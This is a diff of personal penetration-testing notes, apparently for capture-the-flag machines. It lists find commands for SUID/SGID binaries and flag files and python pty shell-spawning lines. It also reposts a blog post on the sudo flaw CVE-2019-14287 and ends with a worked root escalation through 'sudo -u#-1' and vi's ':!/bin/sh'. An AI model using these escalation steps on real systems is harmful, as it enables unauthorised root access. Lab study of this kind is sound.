@@ -1,7 +1,87 @@
 SUID 
 
 find / -perm -u=s -type f 2>/dev/null
+find / -perm -g=s -type f 2>/dev/null
 
+Find all the SUID/SGID executables on the Debian VM:
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+
+find / -type f -user james -exec ls -l {} + 2>/dev/null for a particular user
+
+Finding files own by group os_tester:
+find / -type d  -maxdepth 3 -group os_tester  -ls 2>/dev/null
 
 finding flag
 find / -type f -name "*flag*" -exec ls -l {} + 2>/dev/null
+find / -type f -iname 'root*txt' -exec echo {} \; -exec cat {} \; 2>/dev/null
+find / -type f -iname 'flag*txt' -exec echo {} \; -exec cat {} \; 2>/dev/null
+
+
+
+spawning python shell
+
+python -c 'import pty; pty.spawn("/bin/sh")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+
+
+
+
+
+sudo vulnerability
+ Sudo Vulnerability Cheat Sheet: Learn All About CVE-2019-14287
+Patricia Johnson, October 17, 2019
+
+    #Application Security
+
+By: Daniel Elkabes,  Lead Security Researcher
+
+Over the past few days, news of CVE-2019-14287 — a newly discovered open source vulnerability in Sudo, Linux’s popular command tool has been grabbing quite a few headlines. Since vulnerabilities in widespread and established open source projects can often cause a stir, we decided to present you with a quick cheat sheet to let you know exactly what the fuss is about. 
+
+Here is everything you need to know about the Sudo vulnerability, how it works, and how to handle the vulnerable Sudo component, if you find that you are currently at risk.  
+Why Is The New Sudo Security Vulnerability (CVE-2019-14287) Making Waves?
+
+Let’s start with the basics. Sudo is a program dedicated to the Linux operating system, or any other Unix-like operating system, and is used to delegate privileges. For example, it can be used by a local user who wants to run commands as root — the windows equivalent of admin user. 
+
+On October 14, the Sudo team published a security alert about CVE-2019-14287, a new security issue discovered by Joe Vennix of Apple Information Security, in all Sudo versions prior to version 1.8.28. The security flaw could enable a malicious user to execute arbitrary commands as root user even in cases where the root access is disallowed.
+
+Considering how widespread Sudo usage is among Linux users, it’s no surprise that everybody’s talking about the security vulnerability. 
+Reducing Enterprise Application Security Risks:
+More Work Needs to Be Done
+
+The Sudo Vulnerability Explained
+
+That’s the scary version, and when we think about how powerful and popular Sudo is, CVE-2019-14287 should not be ignored. That said, it’s also important to note that the vulnerability is relevant in a specific configuration in the Sudo security policy, called “sudoers”, which helps ensure that privileges are limited only to specific users. 
+
+The issue occurs when a sysadmin inserts an entry into the sudoers file, for example:
+
+jacob myhost = (ALL, !root) /usr/bin/chmod
+
+This entry means that user jacob is allowed to run “chmod” as any user except the root user, meaning a security policy is in place in order to limit access — sounds good, right? 
+
+Unfortunately, Joe Vennix from Apple Information Security found that the function fails to parse all values correctly and when giving the parameter user id “-1” or its unsigned number “4294967295”, the command will run as root, bypassing the security policy entry we set in the example above. 
+
+In the example below, when we run the “-1” user ID, we get the id number “0” which is the root user value: 
+
+
+sudo -u#-1 id -u
+
+
+Stay Secure: Keep Calm And Update Your Sudo Version 
+
+And now for some good news: the Sudo team has already released a secure version, so If you are using this particular security configuration, make sure to update to version 1.8.28 or over. In addition, as you can see, the Sudo vulnerability only occurs in a very specific configuration. 
+
+As is often the case when newly disclosed security vulnerabilities in popular open source projects make a splash, there’s no need to panic. While Sudo is an extremely popular and widely used project, the vulnerability is only relevant in a specific scenario, and it has already been fixed in the updated version. 
+
+Our best advice is to keep calm, and make sure you update your open source software components. 
+
+
+https://resources.whitesourcesoftware.com/blog-whitesource/new-vulnerability-in-sudo-cve-2019-14287 has good understanding of this vulnerability.But in sort, if you run a user with id -1 sudo can not understand it properly and revert it back to 0 which means root id. so here is what we are going to do,
+
+
+Command : sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
+
+
+
+this will open vi editor and now what you can do is go to command line by typing “:” and then typr “!/bin/sh” and hit enter and it will give you the root shell.
+
